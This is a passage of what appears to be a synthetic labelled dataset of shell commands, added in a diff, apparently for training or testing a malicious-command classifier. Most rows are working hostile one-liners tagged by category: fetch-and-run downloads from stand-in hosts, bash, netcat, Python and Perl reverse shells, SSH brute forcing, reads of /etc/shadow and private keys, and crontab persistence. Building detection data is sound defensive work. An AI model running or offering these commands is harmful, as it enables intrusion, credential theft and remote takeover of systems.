+log-843,2025-09-24T05:03:53.546631Z,"python3 -c 'import urllib.request as u;open(""/tmp/x32.py"",""wb"").write(u.urlopen(""http://evil.example/x32.py"").read())'; python3 /tmp/x32.py",malware_download
+log-844,2025-02-21T11:43:47.546641Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-845,2025-03-03T23:25:34.546650Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-846,2025-05-23T22:32:29.546660Z,wget http://evil.example/x1.sh && chmod +x x1.sh && ./ x1.sh,malware_download
+log-847,2025-07-15T14:53:52.546670Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-848,2025-05-03T22:26:16.546679Z,curl http://evil.example/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-849,2025-06-01T18:14:39.546688Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-850,2025-04-07T01:27:23.546696Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-851,2025-06-26T09:54:49.546706Z,"python3 -c 'import urllib.request as u;open(""/tmp/x99.py"",""wb"").write(u.urlopen(""http://badhost.local/x99.py"").read())'; python3 /tmp/x99.py",malware_download
+log-852,2025-02-28T09:48:29.546715Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-853,2025-02-14T19:55:17.546724Z,for i in {1..1000}; do ssh root@203.0.113.7 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-854,2025-11-06T15:11:16.546733Z,cat /etc/passwd,credential_harvest
+log-855,2025-09-27T23:38:19.546742Z,bash -i >& /dev/tcp/192.0.2.12/8080 0>&1,reverse_shell
+log-856,2025-02-13T01:13:16.546751Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-857,2025-02-18T12:44:35.546759Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-858,2025-01-11T03:25:34.546769Z,curl -fsSL http://payloads.net/install93.php -o /tmp/install93.php; php /tmp/install93.php,malware_download
+log-859,2025-04-18T07:43:51.546778Z,bash -i >& /dev/tcp/172.16.0.9/4444 0>&1,reverse_shell
+log-860,2025-05-27T23:21:04.546787Z,cat /etc/shadow,credential_harvest
+log-861,2025-04-11T10:31:30.546796Z,cat /etc/shadow,credential_harvest
+log-862,2025-10-28T14:42:05.546807Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-863,2025-07-01T21:04:18.546816Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-864,2025-06-29T00:30:48.546825Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-865,2024-12-13T00:21:42.546834Z,mkdir /tmp/xdata17; chmod 777 /tmp/xdata17,persistence_or_filesystem
+log-866,2025-09-20T11:02:45.546843Z,nc -e /bin/sh 45.23.11.9 4444,reverse_shell
+log-867,2025-06-16T17:19:04.546853Z,wget http://malicious.test/payload67.sh && chmod +x payload67.sh && ./ payload67.sh,malware_download
+log-868,2025-02-19T05:03:00.546863Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-869,2025-09-11T17:08:40.546872Z,echo 'hello world',unknown
+log-870,2025-07-28T11:48:46.546882Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
+log-871,2024-12-23T23:12:39.546891Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-872,2025-11-15T05:18:40.546900Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-873,2025-02-18T13:22:11.546908Z,echo 'hello world',unknown
+log-874,2025-10-24T21:20:37.546917Z,find / -name '*.conf' -type f,enumeration
+log-875,2024-12-12T10:34:06.546926Z,cat /etc/shadow,credential_harvest
+log-876,2025-11-20T06:01:21.546936Z,"python3 -c 'import urllib.request as u;open(""/tmp/runme28.py"",""wb"").write(u.urlopen(""http://evil.example/runme28.py"").read())'; python3 /tmp/runme28.py",malware_download
+log-877,2025-07-30T04:45:45.546944Z,cat /etc/passwd,credential_harvest
+log-878,2025-08-19T18:27:39.546954Z,curl -fsSL http://evil.example/runme58.php -o /tmp/runme58.php; php /tmp/runme58.php,malware_download
+log-879,2024-12-19T22:03:24.546964Z,wget http://evil.example/x45.sh && chmod +x x45.sh && ./ x45.sh,malware_download
+log-880,2024-12-30T06:50:42.546973Z,echo '@reboot root /tmp/payload77.sh' >> /etc/crontab,persistence_or_filesystem
+log-881,2025-05-12T18:20:19.546982Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-882,2024-12-15T08:01:29.546992Z,sshpass -p 'toor' ssh ec2-user@45.23.11.9,brute_force
+log-883,2025-06-04T03:19:03.547000Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-884,2025-03-04T12:24:09.547010Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-885,2025-04-27T14:00:53.547019Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 2222 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-886,2025-05-11T00:07:57.547029Z,"perl -e 'use Socket;$i=""172.16.0.9"";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-887,2025-08-14T11:21:16.547038Z,hydra -l root -P /tmp/wordlist.txt ssh://1.2.3.4,brute_force
+log-888,2025-05-29T19:45:14.547047Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-889,2025-11-23T22:19:22.547057Z,for i in {1..1000}; do ssh root@10.0.0.5 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-890,2025-01-25T04:26:38.547066Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-891,2025-08-11T00:16:54.547075Z,nc -e /bin/sh 192.0.2.12 8080,reverse_shell
+log-892,2025-10-21T00:30:41.547084Z,cat /etc/passwd,credential_harvest
+log-893,2025-06-06T21:06:53.547094Z,wget http://malware.srv/p96.sh && chmod +x p96.sh && ./ p96.sh,malware_download
+log-894,2025-10-25T22:40:21.547103Z,bash -i >& /dev/tcp/45.23.11.9/6666 0>&1,reverse_shell
+log-895,2025-09-06T00:31:45.547112Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-896,2024-12-20T12:37:07.547121Z,curl http://malicious.test/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-897,2025-06-14T15:16:52.547131Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""45.23.11.9"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-898,2025-11-25T09:02:51.547140Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-899,2024-12-17T23:17:54.547149Z,sshpass -p 'toor' ssh admin@10.0.0.5,brute_force
+log-900,2025-05-16T20:52:41.547160Z,"perl -e 'use Socket;$i=""1.2.3.4"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-901,2025-04-22T12:28:45.547169Z,bash -i >& /dev/tcp/192.0.2.12/4444 0>&1,reverse_shell
+log-902,2025-01-18T01:34:02.547178Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-903,2025-11-21T23:43:58.547187Z,sshpass -p 'admin123' ssh ec2-user@10.0.0.5,brute_force
+log-904,2025-06-29T23:27:15.547196Z,curl http://payloads.net/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-905,2025-03-12T19:59:22.547206Z,wget http://badhost.local/payload9.sh && chmod +x payload9.sh && ./ payload9.sh,malware_download
+log-906,2025-03-29T09:45:06.547216Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-907,2025-07-15T03:15:28.547225Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
+log-908,2025-01-11T03:18:53.547234Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-909,2025-03-29T05:36:47.547243Z,wget http://payloads.net/update52.sh && chmod +x update52.sh && ./ update52.sh,malware_download
+log-910,2025-12-01T22:51:21.547253Z,curl http://payloads.net/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-911,2025-07-28T02:20:19.547262Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
+log-912,2025-10-03T16:16:50.547274Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-913,2025-06-25T10:19:56.547283Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-914,2025-10-29T01:10:16.547292Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""172.16.0.9"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-915,2025-06-15T20:18:36.547301Z,echo 'hello world',unknown
+log-916,2025-08-16T14:40:02.547310Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-917,2024-12-20T16:43:27.547319Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-918,2025-07-24T02:51:59.547328Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-919,2025-05-17T09:37:22.547337Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-920,2025-05-04T20:50:46.547346Z,for i in {1..1000}; do ssh root@192.0.2.12 -p 9001 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-921,2025-08-01T23:51:46.547355Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-922,2024-12-13T13:10:39.547365Z,wget http://evil.example/payload13.sh && chmod +x payload13.sh && ./ payload13.sh,malware_download
+log-923,2025-01-14T17:25:18.547374Z,nc -e /bin/sh 172.16.0.9 443,reverse_shell
+log-924,2024-12-24T01:22:42.547382Z,cat /etc/shadow,credential_harvest
+log-925,2025-09-11T03:33:10.547391Z,curl http://payloads.net/payload -o /tmp/p && bash /tmp/p,malware_download
+log-926,2024-12-23T17:19:28.547400Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-927,2025-03-30T15:08:08.547409Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-928,2025-01-01T06:13:00.547417Z,date; whoami,unknown
+log-929,2025-03-28T02:46:55.547427Z,for i in {1..1000}; do ssh root@172.16.0.9 -p 80 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-930,2025-01-20T08:04:02.547436Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-931,2025-07-01T20:58:07.547446Z,echo '@reboot root /tmp/install76.sh' >> /etc/crontab,persistence_or_filesystem
+log-932,2025-09-22T10:55:44.547456Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
+log-933,2025-11-29T11:22:57.547464Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-934,2025-11-11T18:45:10.547473Z,curl http://malware.srv/payload -o /tmp/p && bash /tmp/p,malware_download
+log-935,2025-02-11T00:58:06.547482Z,curl http://malware.srv/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-936,2025-02-04T16:35:37.547492Z,nc -e /bin/sh 10.0.0.5 8080,reverse_shell
+log-937,2025-07-04T00:47:26.547502Z,"python3 -c 'import urllib.request as u;open(""/tmp/x54.py"",""wb"").write(u.urlopen(""http://badhost.local/x54.py"").read())'; python3 /tmp/x54.py",malware_download
+log-938,2025-06-29T09:33:49.547512Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-939,2025-02-24T02:56:42.547520Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-940,2025-01-23T08:07:38.547529Z,echo '@reboot root /tmp/payload66.sh' >> /etc/crontab,persistence_or_filesystem
+log-941,2025-10-25T01:54:57.547539Z,echo '@reboot root /tmp/install98.sh' >> /etc/crontab,persistence_or_filesystem
+log-942,2025-02-10T09:18:31.547548Z,nc -e /bin/sh 203.0.113.7 4444,reverse_shell
+log-943,2025-01-19T16:35:16.547558Z,cat /etc/passwd,credential_harvest
+log-944,2025-10-06T08:58:51.547566Z,cat /etc/passwd,credential_harvest
+log-945,2025-04-03T21:12:22.547576Z,curl -fsSL http://evil.example/p16.php -o /tmp/p16.php; php /tmp/p16.php,malware_download
+log-946,2025-09-25T03:58:10.547585Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-947,2025-07-19T13:39:52.547594Z,bash -i >& /dev/tcp/192.0.2.12/9001 0>&1,reverse_shell
+log-948,2025-02-21T13:43:42.547603Z,nc -e /bin/sh 192.0.2.12 443,reverse_shell
+log-949,2025-12-02T22:08:35.547612Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-950,2025-01-05T07:24:13.547621Z,bash -i >& /dev/tcp/172.16.0.9/6666 0>&1,reverse_shell
+log-951,2025-01-30T03:54:53.547630Z,bash -i >& /dev/tcp/172.16.0.9/9001 0>&1,reverse_shell
+log-952,2025-10-19T00:02:23.547640Z,curl http://malicious.test/payload -o /tmp/p ; bash /tmp/p,malware_download
+log-953,2025-05-06T01:33:48.547649Z,hydra -l root -P /tmp/wordlist.txt ssh://10.0.0.5,brute_force
+log-954,2024-12-14T11:32:27.547658Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-955,2025-03-11T20:54:21.547667Z,bash -i >& /dev/tcp/10.0.0.5/2222 0>&1,reverse_shell
+log-956,2025-01-12T08:40:39.547677Z,wget http://evil.example/update53.sh ; chmod +x update53.sh ; ./ update53.sh,malware_download
+log-957,2025-04-26T12:20:31.547687Z,sshpass -p 'admin123' ssh ubuntu@192.0.2.12,brute_force
+log-958,2025-02-02T08:13:36.547696Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-959,2025-02-15T19:07:05.547705Z,bash -i >& /dev/tcp/10.0.0.5/2222 0>&1,reverse_shell
+log-960,2025-11-22T02:43:55.547715Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-961,2025-01-02T01:38:16.547724Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-962,2025-04-05T23:11:36.547733Z,nc -e /bin/sh 203.0.113.7 80,reverse_shell
+log-963,2025-11-27T01:53:30.547742Z,nc -e /bin/sh 1.2.3.4 2222,reverse_shell
+log-964,2025-05-27T23:20:50.547752Z,curl -fsSL http://malware.srv/payload62.php -o /tmp/payload62.php; php /tmp/payload62.php,malware_download
+log-965,2025-06-14T12:00:49.547761Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 4444 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
+log-966,2025-08-02T01:50:10.547770Z,mkdir /tmp/tmpdir2; chmod 777 /tmp/tmpdir2,persistence_or_filesystem
+log-967,2025-10-01T05:50:20.547780Z,curl -fsSL http://payloads.net/update78.php -o /tmp/update78.php; php /tmp/update78.php,malware_download
+log-968,2025-04-23T16:53:08.547790Z,nc -e /bin/sh 1.2.3.4 9001,reverse_shell
+log-969,2025-06-12T12:56:57.547798Z,cp /bin/bash /tmp/.bash; chmod +x /tmp/.bash; /tmp/.bash -c '...',persistence_or_filesystem
+log-970,2025-02-26T20:14:00.547807Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-971,2025-07-21T17:47:12.547817Z,curl -fsSL http://evil.example/p3.php -o /tmp/p3.php; php /tmp/p3.php,malware_download
+log-972,2025-11-14T19:44:07.547826Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-973,2025-01-29T15:39:57.547835Z,curl -fsSL http://payloads.net/payload98.php -o /tmp/payload98.php; php /tmp/payload98.php,malware_download
+log-974,2025-11-07T23:55:51.547848Z,echo '@reboot root /tmp/runme80.sh' >> /etc/crontab,persistence_or_filesystem
+log-975,2025-08-07T23:06:21.547858Z,cat /etc/issue; uname -r; dpkg -l | grep openssh,reconnaissance
+log-976,2025-07-19T14:44:17.547867Z,echo '@reboot root /tmp/payload51.sh' >> /etc/crontab,persistence_or_filesystem
+log-977,2025-11-28T11:53:26.547876Z,"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""1.2.3.4"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",reverse_shell
+log-978,2025-02-27T16:28:25.547886Z,wget http://badhost.local/p75.sh && chmod +x p75.sh && ./ p75.sh,malware_download
+log-979,2025-09-08T22:33:31.547895Z,echo '@reboot root /tmp/install17.sh' >> /etc/crontab,persistence_or_filesystem
+log-980,2025-06-28T02:22:46.547903Z,ss -tulpn; nmap -sT -p- localhost,enumeration
+log-981,2025-08-08T15:10:26.547912Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-982,2025-05-09T01:18:28.547921Z,"python3 -c 'import urllib.request as u;open(""/tmp/update74.py"",""wb"").write(u.urlopen(""http://evil.example/update74.py"").read())'; python3 /tmp/update74.py",malware_download
+log-983,2025-07-09T05:15:50.547930Z,ls -la /; ps aux; netstat -tulpn,reconnaissance
+log-984,2025-03-21T06:44:09.547939Z,curl http://evil.example/payload -o /tmp/p && bash /tmp/p,malware_download
+log-985,2025-02-20T09:34:31.547949Z,cat /etc/passwd,credential_harvest
+log-986,2025-07-22T20:48:23.547957Z,some-weird-tool --foo bar,unknown
+log-987,2025-08-05T11:42:17.547966Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-988,2025-05-06T19:32:30.547975Z,cat /etc/shadow,credential_harvest
+log-989,2025-06-29T23:36:44.547984Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-990,2025-10-06T12:39:55.547994Z,"python3 -c 'import urllib.request as u;open(""/tmp/x59.py"",""wb"").write(u.urlopen(""http://malware.srv/x59.py"").read())'; python3 /tmp/x59.py",malware_download
+log-991,2025-09-30T09:09:37.548003Z,"perl -e 'use Socket;$i=""45.23.11.9"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-992,2025-06-17T06:22:19.548012Z,ls /var/www; ls /srv; curl http://localhost:80/.env,enumeration
+log-993,2025-04-27T17:22:28.548021Z,uname -a; id; hostname; ifconfig -a,reconnaissance
+log-994,2025-01-08T11:23:41.548030Z,"grep -Ri ""password"" /home || grep -Ri ""AWS_SECRET"" /etc || cat /root/.ssh/id_rsa",credential_harvest
+log-995,2025-11-12T07:22:04.548040Z,"perl -e 'use Socket;$i=""203.0.113.7"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec""/bin/sh -i"";}'",reverse_shell
+log-996,2025-09-06T22:41:36.548049Z,hydra -l root -P /tmp/wordlist.txt ssh://203.0.113.7,brute_force
+log-997,2025-07-12T17:56:12.548059Z,curl -fsSL http://payloads.net/update37.php -o /tmp/update37.php; php /tmp/update37.php,malware_download
+log-998,2025-08-23T07:48:12.548068Z,sshpass -p 'password' ssh root@10.0.0.5,brute_force
+log-999,2025-07-15T07:06:42.548078Z,find / -name '*.conf' -type f,enumeration
+log-1000,2025-04-29T09:56:54.548087Z,for i in {1..1000}; do ssh root@45.23.11.9 -p 443 -o ConnectTimeout=2 -o BatchMode=no; done,brute_force
